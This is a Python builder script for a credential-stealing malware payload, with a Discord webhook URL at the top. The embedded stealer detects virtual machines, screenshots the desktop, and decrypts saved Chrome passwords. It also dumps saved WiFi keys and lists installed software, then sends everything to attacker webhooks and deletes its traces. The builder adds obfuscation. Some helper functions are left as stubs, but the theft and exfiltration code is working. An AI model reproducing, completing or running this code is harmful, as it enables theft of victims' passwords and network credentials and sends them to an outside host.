https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO


import os
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext
import shutil
import tempfile
import textwrap
import requests

# GUI and test_webhook same as last working version...

# =================== STEALER CODE - NOW WITH MORE LOOT ===================
stealer_code = textwrap.dedent('''
import os
import sys
import time
import subprocess
import socket
import requests
import ctypes
import platform
import uuid
import winreg
import random
from datetime import datetime

try:
    import pyautogui
    HAS_PYAUTO = True
except:
    HAS_PYAUTO = False

# New imports for extra loot
import sqlite3
import json
import base64
import shutil
from Crypto.Cipher import AES  # pycryptodome
import win32crypt  # pypiwin32

# VM checks unchanged...

def is_vm():
    # [same as before]
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum")
        val = winreg.QueryValueEx(key, "0")[0].lower()
        if any(x in val for x in ["vmware", "vbox", "virtual", "qemu", "xen"]):
            return "Yes (Disk Enum)"
        winreg.CloseKey(key)
    except: pass

    # ... rest same

    return "No"

# IP/HWID same...

def get_public_ip():
    # same

def get_local_ip():
    # same

def get_hwid():
    # same

# NEW: Grab Chrome passwords
def grab_chrome_passwords():
    data = ""
    try:
        # Copy Login Data to temp (Chrome locks it)
        login_db = os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        if not os.path.exists(login_db):
            return "Chrome not found or no profile"
        temp_db = os.path.join(os.getenv("TEMP"), f"LoginVault_{random.randint(10000,99999)}.db")
        shutil.copyfile(login_db, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            if encrypted_password:
                try:
                    # Old method
                    password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
                except:
                    # New method (v80+)
                    try:
                        master_key_path = os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data", "Local State")
                        with open(master_key_path, "r", encoding="utf-8") as f:
                            local_state = json.loads(f.read())
                        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                        iv = encrypted_password[3:15]
                        ciphertext = encrypted_password[15:]
                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                        password = cipher.decrypt(ciphertext)[:-16].decode()
                    except:
                        password = "DECRYPT FAILED"
                data += f"{url} | {username} | {password}\\n"
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        data = f"Error: {str(e)}"
    return data if data else "No passwords found"

# NEW: Grab saved WiFi passwords
def grab_wifi_passwords():
    data = ""
    try:
        profiles = subprocess.check_output("netsh wlan show profiles", text=True, shell=True)
        profile_names = [line.split(":")[1].strip() for line in profiles.split("\\n") if "All User Profile" in line]
        for name in profile_names:
            try:
                info = subprocess.check_output(f'netsh wlan show profile name="{name}" key=clear', text=True, shell=True)
                key_line = [line for line in info.split("\\n") if "Key Content" in line]
                password = key_line[0].split(":")[1].strip() if key_line else "None"
                data += f"{name} : {password}\\n"
            except:
                data += f"{name} : FAILED\\n"
    except Exception as e:
        data = f"Error: {str(e)}"
    return data if data else "No WiFi profiles"

# NEW: List installed software
def list_installed_software():
    data = ""
    hives = [(winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_64KEY), (winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_32KEY), (winreg.HKEY_CURRENT_USER, 0)]
    for hive, flag in hives:
        try:
            key = winreg.OpenKey(winreg.ConnectRegistry(None, hive), r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, winreg.KEY_READ | flag)
            for i in range(winreg.QueryInfoKey(key)[0]):
                subkey_name = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, subkey_name)
                try:
                    name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                    data += f"{name} - {version}\\n"
                except:
                    pass
                subkey.Close()
            key.Close()
        except:
            pass
    return data if data else "No software found"

def exfil(webhooks):
    time.sleep(random.uniform(5, 15))

    base_data = f"""
RECON REPORT - {datetime.utcnow().isoformat()} UTC
================================================
Username      : {os.getenv("USERNAME")}
Computer Name : {platform.node()}
OS            : {platform.system()} {platform.release()} ({platform.version()})
CPU           : {platform.processor()}
HWID          : {get_hwid()}
VM Detected   : {is_vm()}
Public IP     : {get_public_ip()}
Local IP      : {get_local_ip()}
"""

    files_to_send = {}
    temp_files = []

    # Recon
    recon_path = os.path.join(os.getenv("TEMP"), f"recon_{random.randint(10000,99999)}.txt")
    with open(recon_path, "w", encoding="utf-8") as f:
        f.write(base_data)
    files_to_send["recon.txt"] = open(recon_path, "rb")
    temp_files.append(recon_path)

    # Screenshot
    if HAS_PYAUTO:
        try:
            screen_path = os.path.join(os.getenv("TEMP"), f"screen_{random.randint(10000,99999)}.png")
            pyautogui.screenshot(screen_path)
            files_to_send["screenshot.png"] = open(screen_path, "rb")
            temp_files.append(screen_path)
        except: pass

    # Chrome passwords
    chrome_data = grab_chrome_passwords()
    if chrome_data.strip():
        chrome_path = os.path.join(os.getenv("TEMP"), f"chrome_pw_{random.randint(10000,99999)}.txt")
        with open(chrome_path, "w", encoding="utf-8") as f:
            f.write("CHROME PASSWORDS\\n" + chrome_data)
        files_to_send["chrome_passwords.txt"] = open(chrome_path, "rb")
        temp_files.append(chrome_path)

    # WiFi passwords
    wifi_data = grab_wifi_passwords()
    if wifi_data.strip():
        wifi_path = os.path.join(os.getenv("TEMP"), f"wifi_pw_{random.randint(10000,99999)}.txt")
        with open(wifi_path, "w", encoding="utf-8") as f:
            f.write("SAVED WIFI PASSWORDS\\n" + wifi_data)
        files_to_send["wifi_passwords.txt"] = open(wifi_path, "rb")
        temp_files.append(wifi_path)

    # Installed software
    soft_data = list_installed_software()
    if soft_data.strip():
        soft_path = os.path.join(os.getenv("TEMP"), f"installed_soft_{random.randint(10000,99999)}.txt")
        with open(soft_path, "w", encoding="utf-8") as f:
            f.write("INSTALLED SOFTWARE\\n" + soft_data)
        files_to_send["installed_software.txt"] = open(soft_path, "rb")
        temp_files.append(soft_path)

    # Exfil loop
    for hook in webhooks:
        try:
            payload = {"content": f"**MASSIVE HIT** - {os.getenv('USERNAME')}@{platform.node()} - Chrome/WiFi/Software grabbed"}
            resp = requests.post(hook, data=payload, files=files_to_send, timeout=30)
            if resp.status_code in (200, 204):
                break
        except: continue
    else:
        try:
            requests.post(webhooks[0], json={"content": f"Fallback: Files failed - base recon:\\n```\\n{base_data}\\n```"})
        except: pass

    # Cleanup
    for f in files_to_send.values():
        try: f.close()
        except: pass
    for p in temp_files:
        try: os.remove(p)
        except: pass

exfil({WEBHOOK_PLACEHOLDER})
''')

# BUILD - Updated hidden imports for new deps
def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
    # same as last working version, but add more hidden imports
    hidden_imports = [
        "pyarmor_runtime", "uuid", "ctypes", "socket", "winreg", "platform",
        "datetime", "random", "subprocess", "os", "sys", "time", "requests", 
        "pyautogui", "sqlite3", "json", "base64", "shutil", "win32crypt",
        "Crypto.Cipher.AES"  # pycryptodome
    ]
    # ... rest same

if __name__ == "__main__":
    get_webhook()

if __name__ == "__main__":
    get_webhook()
